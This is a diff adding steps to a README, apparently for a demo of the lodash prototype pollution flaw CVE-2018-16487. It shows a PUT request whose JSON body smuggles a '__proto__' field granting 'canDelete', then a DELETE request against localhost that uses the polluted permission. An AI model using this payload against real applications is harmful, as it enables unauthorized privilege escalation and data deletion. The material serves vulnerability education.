@@ -54,3 +54,16 @@ The Prototype Pollution vulnerability (CVE-2018-16487) introduced by [lodash@4.1
      --header 'content-type: application/json' \
      --data '{"auth": {"name": "user", "password": "pwd"}, "messageId": 1}'
    ```
+   
+You can use Postmen for the HTTP requests.
+PUT message at http://localhost:3000
+{ 
+	"auth": {"name": "user", "password": "pwd"},
+	"message": { "text": "😈", "__proto__": {"canDelete": true}}
+}
+
+DELETE message at http://localhost:3000
+{
+	"auth": {"name": "user", "password": "pwd"}, 
+	"messageId": 1
+}
